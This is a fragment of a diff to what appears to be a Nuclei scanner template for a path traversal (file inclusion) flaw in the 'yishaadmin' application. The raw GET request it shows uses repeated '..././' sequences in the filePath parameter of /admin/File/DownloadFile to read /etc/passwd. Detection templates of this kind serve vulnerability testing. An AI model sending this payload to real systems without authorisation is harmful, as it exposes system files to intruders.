@@ -13,10 +13,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,yishaadmin,huntr
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - raw:
       - |
         GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
